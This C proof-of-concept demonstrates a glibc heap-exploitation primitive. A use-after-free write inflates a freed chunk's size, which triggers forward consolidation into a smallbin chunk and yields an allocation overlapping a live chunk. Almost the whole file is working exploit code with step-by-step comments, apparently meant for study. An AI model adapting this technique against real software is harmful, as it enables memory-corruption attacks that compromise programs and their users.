/*
 * fw-consolidate-smallbin.c - Forward consolidation via SIZE forgery
 *
 * Produces overlapping chunks with 8 bytes of corruption.
 * Inflate B's SIZE -> nextchunk lands on W -> free(B) triggers forward
 * consolidation merging B+W -> overlapping intermediate T.
 *
 * Single tcache fill: B's inflated SIZE (0x41, bin[0x40]) matches W's
 * bin[0x40], one fill exhausts both paths.
 *
 * Layout: A[0x20] | B[0x20] | T[0x20] | W[0x40] | guard[0x20]
 *                \_ B+0x40 = W after SIZE 0x21->0x41
 *
 * Build: G=./glibc/build/install
 *   gcc -g -o poc poc.c -Wl,-rpath,$G/lib -Wl,--dynamic-linker=$G/lib/ld-linux-aarch64.so.1
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define TC 16

static void fill_tcache(size_t chunk_size) {
    void *pads[TC];
    size_t req = chunk_size - 0x10;
    for (int i = 0; i < TC; i++) pads[i] = malloc(req);
    for (int i = 0; i < TC; i++) free(pads[i]);
}

int main(void) {
    printf("\nForward Consolidation via SIZE Forgery (glibc 2.43)\n\n");

    /* Single-bin layout: B inflated -> bin[0x40], W also bin[0x40] */
    char *A     = malloc(0x18);  /* 0x20 chunk */
    char *B     = malloc(0x18);  /* 0x20 chunk -- victim */
    char *T     = malloc(0x18);  /* 0x20 chunk -- overlap target */
    char *W     = malloc(0x38);  /* 0x40 chunk -- consolidation target */
    char *guard = malloc(0x18);

    printf("A=%p  B=%p  T=%p  W=%p  guard=%p\n", (void*)A, (void*)B, (void*)T, (void*)W, (void*)guard);
    if ((uintptr_t)W != (uintptr_t)B + 0x40) { printf("Shit, layout broken!\n"); return 1; }

    /* [1] free B -> tcache[0x20] */
    printf("[1] free(B) -> tcache[0x20]\n");
    free(B);

    /* [2] UAF: B->size 0x21 -> 0x41 (nextchunk(B) = W).
     *     tcache never touches the header -- SIZE survives intact. */
    size_t *szB = (size_t*)((char*)B - 8);
    printf("[2] UAF: B->size 0x%zx -> 0x41\n", *szB);
    *szB = 0x41;

    /* [3] retrieve B: tc_get returns raw pointer -- no set_head */
    printf("[3] malloc(0x18) -> %p  (SIZE=0x%zx %s tcache round-trip)\n",
           (void*)malloc(0x18), *szB, *szB == 0x41 ? "OK" : "XX");

    /* [4] Single fill: tcache[0x40] exhausted -> both free(B) and free(W)
     *     hit arena.  free(W) -> smallbin (doubly-linked for unlink_chunk). */
    printf("[4] Fill tcache[0x40] -> free(W) -> smallbin\n");
    fill_tcache(0x40);
    free(W);

    /* [5] free(B) -> chunksize=0x40, nextchunk=W.  tcache[0x40] full -> arena:
     *     inuse_bit_at_offset(W, 0x40)==0 -> unlink_chunk(W) -> merge 0x80 */
    printf("[5] free(B) -> arena -> forward consolidation... ");
    free(B);
    printf("OK!\n");

    /* [6] malloc(0x78) -> merged 0x80 chunk (B[0x40] + W[0x40]) */
    char *ov = malloc(0x78);
    printf("[6] malloc(0x78) -> %p  %s\n", (void*)ov, ov == B ? "OK! OVERLAP!" : "NOPE!");

    /* Prove T is forgotten: write through ov, read through T */
    memset(ov, 'X', 0x78);
    printf("[+] T is at ov+0x20: %016lx  %s\n",
           *(uint64_t*)T, *(uint64_t*)T == 0x5858585858585858ULL ? "OK! FORGOTTEN!" : "NOPE!");

    free(ov);
    free(A);

    printf("[+] Done!\n");
    return 0;
}
